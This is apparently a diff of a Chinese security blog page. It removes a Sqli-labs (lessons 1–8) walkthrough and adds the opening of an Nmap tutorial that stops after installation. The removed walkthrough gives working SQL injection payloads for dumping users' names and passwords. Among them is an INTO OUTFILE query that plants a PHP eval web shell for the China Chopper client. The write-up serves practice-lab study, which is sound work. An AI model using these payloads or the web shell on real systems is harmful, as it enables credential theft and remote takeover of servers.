@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Sqli-labs闯关记录(Less1—8) 详细！ | 未完成的歌</title>
-  <meta name="keywords" content=" sql注入 ">
-  <meta name="description" content="Sqli-labs闯关记录(Less1—8) 详细！ | 未完成的歌">
+  <title>Nmap使用详解 | 未完成的歌</title>
+  <meta name="keywords" content=" nmap ">
+  <meta name="description" content="Nmap使用详解 | 未完成的歌">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="[toc] 前言：今天来总结一下Nmap注入神器的详细使用方法。 一、Nmap介绍Nmap(Network Mapper，网络映射器)是一款开放源代码的网络探测和安全审核工具。它被设计用来快速扫描大型网络，包括主机探测与发现、开放的端口情况、操作系统与应用服务指纹识别、WAF识别及常见安全漏洞。它的图形化界面是Zenmap，分布式框架为DNmap。 1、Nmap的特点如下： 主机探测：探测网络上的">
 <meta property="og:type" content="article">
@@ -1178,9 +1178,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Sqli-labs闯关(Less1—8) 详细！" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Nmap使用详解" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Sqli-labs闯关记录(Less1—8) 详细！</h1>
+        <h1 class="article-title">Nmap使用详解</h1>
     
     <div class="article-meta">
         
@@ -1190,9 +1190,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="漏洞原理">漏洞原理</a> > 
-            
-            <a  data-rel="漏洞原理&lt;---&gt;Sql注入">Sql注入</a>
+            <a  data-rel="工具使用">工具使用</a>
             
         </span>
         
@@ -1200,19 +1198,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color1">sql注入</a>
+            <a class="color5">nmap</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2021-01-20 16:05:25'>2019-07-28 23:23</time>
+            发布时间 : <time class="date" title='最后更新: 2021-03-02 17:45:48'>2021-03-02 16:57</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:2k</span>
+        <span>字数:1.1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1231,7 +1229,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81Nmap%E4%BB%8B%E7%BB%8D"><span class="toc-text">一、Nmap介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81Nmap%E7%9A%84%E7%89%B9%E7%82%B9%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">1、Nmap的特点如下：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%89%E8%A3%85Nmap"><span class="toc-text">二、安装Nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81Nmap%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">三、Nmap常用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E6%89%AB%E6%8F%8F%E5%8D%95%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">1、扫描单个目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E6%89%AB%E6%8F%8F%E5%A4%9A%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">2、扫描多个目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E6%89%AB%E6%8F%8F%E4%B8%80%E4%B8%AA%E8%8C%83%E5%9B%B4%E5%86%85%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">3、扫描一个范围内的目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E3%80%81%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E6%89%80%E5%9C%A8%E7%9A%84%E6%9F%90%E4%B8%AA%E7%BD%91%E6%AE%B5%EF%BC%9A"><span class="toc-text">4、扫描目标地址所在的某个网段：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5%E3%80%81%E6%89%AB%E6%8F%8F%E4%B8%BB%E6%9C%BA%E5%88%97%E8%A1%A8targets-txt%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">5、扫描主机列表targets.txt中的所有目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6%E3%80%81%E6%89%AB%E6%8F%8F%E9%99%A4%E6%9F%90%E4%B8%80%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E4%B9%8B%E5%A4%96%E7%9A%84%E6%89%80%E6%9C%89%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">6、扫描除某一个目标地址之外的所有目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7%E3%80%81%E6%89%AB%E6%8F%8F%E9%99%A4%E6%9F%90%E4%B8%80%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E4%B9%8B%E5%A4%96%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">7、扫描除某一文件中的目标地址之外的目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#8%E3%80%81%E6%89%AB%E6%8F%8F%E6%9F%90%E4%B8%80%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E7%9A%8421%E3%80%8122%E3%80%8123%E3%80%8180%E7%AB%AF%E5%8F%A3%EF%BC%9A"><span class="toc-text">8、扫描某一目标地址的21、22、23、80端口：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#9%E3%80%81%E5%AF%B9%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E8%B7%AF%E7%94%B1%E8%B7%9F%E8%B8%AA%EF%BC%9A"><span class="toc-text">9、对目标地址进行路由跟踪：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#10%E3%80%81%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E6%89%80%E5%9C%A8C%E6%AE%B5%E7%9A%84%E5%9C%A8%E7%BA%BF%E7%8A%B6%E5%86%B5%EF%BC%9A"><span class="toc-text">10、扫描目标地址所在C段的在线状况：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#11%E3%80%81%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%EF%BC%9A"><span class="toc-text">11、目标地址的操作系统指纹识别：</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1247,83 +1245,55 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Less 1—8<br>日后慢补！(●’◡’●)</p>
-<a id="more"></a>
-
-<p>补课补课<br><strong>Less-1</strong><br>根据题目提示为单引号注入，先测试一下<br><img src="http://img-blog.csdnimg.cn/20190604202334654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>果然报错了，说明我们添加的单引号被数据库成功解析，那我们就可以通过闭合id这个参数 ,然后构造自己的sql语句进行攻击。一般可以使用联合表的方式来提取自己想要的信息（union），但是使用union语句有个前提就是union 后面的语句必须与前面的语句字段数以及类型必须一直，否则数据库会报错。<br>那么知道这个我们就开始查字段吧<br>确定字段数一般可以使用order by 语句：<br><code>http://localhost/sqlilabs/Less-1/?id=1&#39;order by 1 %23</code><br>执行成功<br><code>http://localhost/sqlilabs/Less-1/?id=1&#39; order by 2 %23</code><br>执行成功<br><code>http://localhost/sqlilabs/Less-1/?id=1&#39; order by 3 %23</code><br>执行成功<br><code>http://localhost/sqlilabs/Less-1/?id=1&#39; order by 4 %23</code><br>报错：<br><img src="http://img-blog.csdnimg.cn/20190609193657260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>//注意这里使用  <code>#</code> 是不行的，游览器没有帮我们编码，所以我们自己编<br>   <code>%23</code> 为<code>#</code>的url编码，<code>--+</code>可以直接使用//</p>
-<p>   即只有三个字段，那么现在开始联合查询：<br>   因为sql语句的执行结果<strong>只有第一行</strong>会被回显在页面上，所以我们要把原始语句的的结果集变为空，这样我们想要的结果才能显示在界面上<br>   同时又需要确定哪几个字段会被显示在页面上：<br>   <img src="https://img-blog.csdnimg.cn/20190609195252896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   可以看出2，3字段被显示出来，<br>   接着爆数据库<img src="https://img-blog.csdnimg.cn/20190609195604428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   看到数据库名为：<strong>security</strong>，接着再查其他信息</p>
-<pre><code>   http://localhost/sqli-labs/Less-1/
-?id=&#39;union select 1,2,concat_ws((char(32,58,32)),user(),database(),version())--+</code></pre>
-<p><img src="http://img-blog.csdnimg.cn/20190609201140811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   这里我使用了<strong>concat_ws()</strong> 函数：<br>  concat_ws(separator,str1,str2,…)<br>  第一个参数是其它参数的分隔符。分隔符的位置放在要连 接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。<br>ps:<br> select concat_ws(‘,’,’11’,’22’,’33’);   　11,22,33<br> **group_concat()**： 使多行数据在一列显示<br> char(32,58,32)对应ascill码为<code>空格：空格</code><br>user():返回当前数据库连接使用的用户<br>database():返回当前数据库连接使用的数据库<br>version():返回当前数据库的版本<br>我们还要知道在Mysql中有information_schema这个库，该库存放了所有数据库的信息。</p>
-<pre><code>information_schema.columns包含所有表的字段
-information_schema.tables包含所有库的表名
-information_schema.schemata包含所有数据库的名
-table_schema 数据库名
-table_name 表名
-column_name 列名
-schema_name 数据库名</code></pre>
-<p>OK 得到这些信息之后我们再来看看数据库有哪些表</p>
-<pre><code>http://localhost/sqli-labs/Less-1/
-?id=&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></pre>
-<p><img src="http://img-blog.csdnimg.cn/2019060920432537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到有四张表，我们想要的信息基本都在<strong>user</strong>表下<br>我们对这张表爆列名：</p>
-<pre><code>http://localhost/sqli-labs/Less-1/
-?id=0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></pre>
-<p><img src="http://img-blog.csdnimg.cn/20190609211043656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>  接着进行爆用户信息</p>
-<p><code>?id=0&#39; union select 1,group_concat(username),group_concat(password) from users --+</code></p>
-<p><img src="http://img-blog.csdnimg.cn/20190609211207363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>或者单独爆一个人</p>
-<pre><code>?id=-1&#39;union select 1,username,password from users where id=2 --+</code></pre>
-<p><img src="http://img-blog.csdnimg.cn/20190728231327714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>   OKヾ(≧▽≦*)o 第一关到此结束。</p>
-<p>   <strong>Less-2</strong></p>
-<p>看一下源代码，发现没有任何防护，连单引号都没有，可以直接联合查询</p>
-<pre><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
-$result=mysql_query($sql);
-$row = mysql_fetch_array($result);</code></pre>
-<p><img src="http://img-blog.csdnimg.cn/20190611172309372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   可以和第一题一样随便查了。<br>   <strong>Less-3</strong></p>
-<p>1.输入?id=1’ –+ 页面报错<br><img src="http://img-blog.csdnimg.cn/20190611180106383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>但输入?id=1’)  –+   页面是正常的<br><img src="http://img-blog.csdnimg.cn/20190611180950876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以可以判断出此题为字符串注入，以（’’)的方式闭合的。<br>OK 知道这些后 其余的步骤就同上了。</p>
-<p><strong>less4</strong><br>这题的闭合方式为（” “）,多试几次就行了<br><img src="http://img-blog.csdnimg.cn/20190611182521357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其余同上。<br><strong>Less-5</strong> 双注入get单引号字符型注入<br>首先打开网页输入<code>?id=1</code><br><img src="http://img-blog.csdnimg.cn/20190611201540176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然而并没有显示用户名和密码，这是咋回事？查看一下源代码</p>
-<pre><code>if($row)
-    &#123;
-      echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#39;;    
-      echo &#39;You are in...........&#39;;
-      echo &quot;&lt;br&gt;&quot;;
-        echo &quot;&lt;/font&gt;&quot;;
-      &#125;
-    else 
-    &#123;
-
-    echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;;
-    print_r(mysql_error());
-    echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;    
-    echo &#39;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#39;;    
-
-    &#125;</code></pre>
-<p>可以看到根本就没有输出 $row 这个查询结果。<br>根据题目此题为双注入，查看了一些大佬的文章之后终于明白了，<br>双查询注入顾名思义形式上是两个嵌套的查询，即select …(select …)，里面的那个select被称为子查询，他的执行顺序也是先执行子查询，然后再执行外面的select，双注入主要涉及到了几个sql函数：</p>
-<p><strong>rand()随机函数，返回0~1之间的某个值<br>floor(a)取整函数，返回小于等于a，且值最接近a的一个整数<br>count()聚合函数也称作计数函数，返回查询对象的总数<br>group by cluase分组语句，按照cluase对查询结果分组</strong></p>
-<p>详解请查看blog <a target="_blank" rel="noopener" href="https://blog.csdn.net/Leep0rt/article/details/78556440">双注入详解</a>不懂的同学一定要看哦！</p>
-<p>双注入的原理总的来说就是，当一个聚合函数后面出现group分组语句时，会将查询的一部分结果以报错的形式返回，他有一个固定的公式。 那么开始构建sql语句：</p>
-<pre><code>Less-5/?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select database()),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a--+  //这里我们给查询的数据起了另一个名：a</code></pre>
-<p>group by a字段，就是a字段有多少不同的值就有多少组，例如A字段有“a,b,b,c,c,c,d”，abcd各分一组，总共4组<br><img src="http://img-blog.csdnimg.cn/20190612193104255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>OK得到数据库了，然后就可以以同样地方式得到其他信息。</p>
-<p><strong>获取表名：</strong></p>
-<pre><code>?id=-1&#39; union select count(*),1, concat(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</code></pre>
-<p><img src="http://img-blog.csdnimg.cn/20190612200651311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>查询用户信息：</strong></p>
-<pre><code>?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select concat_ws(char(32,44,32),id,username,password) from users limit 1,1),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a--+  </code></pre>
-<p><img src="http://img-blog.csdnimg.cn/20190612200808485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第五关结束。<br><strong>Less-6</strong> 双注入GET双引号字符型注入<br>额 这题就是把上题的单引号变成了双引号。看看上面那题就好。</p>
-<p><strong>Less-7</strong> 导出文件GET字符型注<br>打开页面输入<code>?id=1</code><img src="http://img-blog.csdnimg.cn/2019072118404036.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>试了很多发现报错信息都一样，查看下源代码：</p>
-<pre><code>if($row)
-    &#123;
-      echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;    
-      echo &#39;You are in.... Use outfile......&#39;;
-      echo &quot;&lt;br&gt;&quot;;
-      echo &quot;&lt;/font&gt;&quot;;
-      &#125;
-    else 
-    &#123;
-    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-    echo &#39;You have an error in your SQL syntax&#39;;</code></pre>
-<p>发现 他把报错做了处理统一返回“You have an error in your SQL syntax”，同时他也给出了提示：<br>use outfile 也就是说需要使用outfile函数：<br>outfile函数就是将数据库的查询内容导出到一个外部文件<br>这时候就可以用菜刀了。</p>
-<p>构造语句 写入<strong>一句话木马</strong> 就可以和菜刀连接了（ps：这里必须要写入根目录，不然菜刀没权限）<br><code>?id=-1&#39;))  union select 1,&quot;&lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt;&quot;,3 into outfile &quot;C:\\phpStudy\\WWW\\123.php&quot; --+</code><br><img src="http://img-blog.csdnimg.cn/2019072822315399.png" alt="在这里插入图片描述"><br>可以看到文件已将写入目录下了，<strong>如果有无法写入的小伙伴可以私信我哦，或者在下面评论</strong>✪ ω ✪<br>打开菜刀，右键添加<code>http://127.0.0.1/123.php</code>地址填入你上传文件的地址，后面的小方框中填入你构造的密码，也就是<code>chopper</code><br><img src="http://img-blog.csdnimg.cn/20190728223632460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接成功，就可以直接访问数据库了，嘿嘿嘿。<br><img src="http://img-blog.csdnimg.cn/20190728223719425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><strong>Level-8</strong> 布尔型单引号GET盲注)<br><img src="http://img-blog.csdnimg.cn/20190727231427549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目已经提示了，为单引号盲注，先测试下<br><img src="http://img-blog.csdnimg.cn/20190727232549864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>加单引号报错，注释后回显正常，确实是单引号注入，而且没有报错回显。接着用菜刀吧，步骤和上题一样，这里给出语句：<br><code>?id=1&#39; union select 1,&quot;&lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt;&quot;,3 into outfile &quot;C:\\phpStudy\\WWW\\123.php&quot; --+</code> OK。</p>
+        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81Nmap%E4%BB%8B%E7%BB%8D"><span class="toc-text">一、Nmap介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81Nmap%E7%9A%84%E7%89%B9%E7%82%B9%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">1、Nmap的特点如下：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%89%E8%A3%85Nmap"><span class="toc-text">二、安装Nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81Nmap%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">三、Nmap常用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E6%89%AB%E6%8F%8F%E5%8D%95%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">1、扫描单个目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E6%89%AB%E6%8F%8F%E5%A4%9A%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">2、扫描多个目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E6%89%AB%E6%8F%8F%E4%B8%80%E4%B8%AA%E8%8C%83%E5%9B%B4%E5%86%85%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">3、扫描一个范围内的目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E3%80%81%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E6%89%80%E5%9C%A8%E7%9A%84%E6%9F%90%E4%B8%AA%E7%BD%91%E6%AE%B5%EF%BC%9A"><span class="toc-text">4、扫描目标地址所在的某个网段：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5%E3%80%81%E6%89%AB%E6%8F%8F%E4%B8%BB%E6%9C%BA%E5%88%97%E8%A1%A8targets-txt%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">5、扫描主机列表targets.txt中的所有目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6%E3%80%81%E6%89%AB%E6%8F%8F%E9%99%A4%E6%9F%90%E4%B8%80%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E4%B9%8B%E5%A4%96%E7%9A%84%E6%89%80%E6%9C%89%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">6、扫描除某一个目标地址之外的所有目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7%E3%80%81%E6%89%AB%E6%8F%8F%E9%99%A4%E6%9F%90%E4%B8%80%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E4%B9%8B%E5%A4%96%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-text">7、扫描除某一文件中的目标地址之外的目标地址：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#8%E3%80%81%E6%89%AB%E6%8F%8F%E6%9F%90%E4%B8%80%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E7%9A%8421%E3%80%8122%E3%80%8123%E3%80%8180%E7%AB%AF%E5%8F%A3%EF%BC%9A"><span class="toc-text">8、扫描某一目标地址的21、22、23、80端口：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#9%E3%80%81%E5%AF%B9%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E8%B7%AF%E7%94%B1%E8%B7%9F%E8%B8%AA%EF%BC%9A"><span class="toc-text">9、对目标地址进行路由跟踪：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#10%E3%80%81%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E6%89%80%E5%9C%A8C%E6%AE%B5%E7%9A%84%E5%9C%A8%E7%BA%BF%E7%8A%B6%E5%86%B5%EF%BC%9A"><span class="toc-text">10、扫描目标地址所在C段的在线状况：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#11%E3%80%81%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%EF%BC%9A"><span class="toc-text">11、目标地址的操作系统指纹识别：</span></a></li></ol></li></ol></div></p>
+<h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>今天来总结一下Nmap注入神器的详细使用方法。<hr></p>
+<h4 id="一、Nmap介绍"><a href="#一、Nmap介绍" class="headerlink" title="一、Nmap介绍"></a>一、Nmap介绍</h4><p><img src="https://img-blog.csdnimg.cn/20210225160534331.png">Nmap(Network Mapper，网络映射器)是一款开放源代码的网络探测和安全审核工具。它被设计用来快速扫描大型网络，包括主机探测与发现、开放的端口情况、操作系统与应用服务指纹识别、WAF识别及常见安全漏洞。它的图形化界面是Zenmap，分布式框架为DNmap。</p>
+<h5 id="1、Nmap的特点如下："><a href="#1、Nmap的特点如下：" class="headerlink" title="1、Nmap的特点如下："></a>1、Nmap的特点如下：</h5><ul>
+<li><p>主机探测：探测网络上的主机，如列出响应TCP和ICMP请求、ICMP请求、开放特别端口的主机。</p>
+</li>
+<li><p>端口扫描：探测目标主机所开放的端口。</p>
+</li>
+<li><p>版本检测：探测目标主机的网络服务，判断其服务名称及版本号。</p>
+</li>
+<li><p>系统检测:探测目标主机的操作系统及网络设备的硬件特性。</p>
+</li>
+<li><p>支持探测脚本的编写:使用Nmap的脚本引擎(NSE)和Lua编程语言。</p>
+</li>
+</ul>
+<h4 id="二、安装Nmap"><a href="#二、安装Nmap" class="headerlink" title="二、安装Nmap"></a>二、安装Nmap</h4><p>Windows中Nmap下载地址：<a target="_blank" rel="noopener" href="https://nmap.org/download.html">https://nmap.org/download.html</a><img src="https://img-blog.csdnimg.cn/20210225162039690.png"><br>在安装的过程中按照提示一步步进行即可<br><img src="https://img-blog.csdnimg.cn/20210225162723148.png"><br>安装完成后可以直接通过命令行使用<br><img src="https://img-blog.csdnimg.cn/20210225164014744.png"></p>
